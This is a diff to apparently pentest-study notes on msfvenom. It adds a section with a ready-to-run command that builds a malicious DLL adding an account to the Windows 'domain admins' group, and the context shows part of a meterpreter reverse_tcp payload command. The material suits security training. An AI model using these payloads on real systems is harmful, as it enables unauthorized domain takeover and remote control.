@@ -8,7 +8,6 @@ tags:
   - terminal
   - shells
 ---
-
 # msfvenom
 
 MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
@@ -101,6 +100,14 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip 
 ```
 
 But, still, we could be getting detected.
+
+## Crafting a dll that executes a command
+
+We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.
+
+```shell-session
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
 
 
 ## Module msf-virustotal
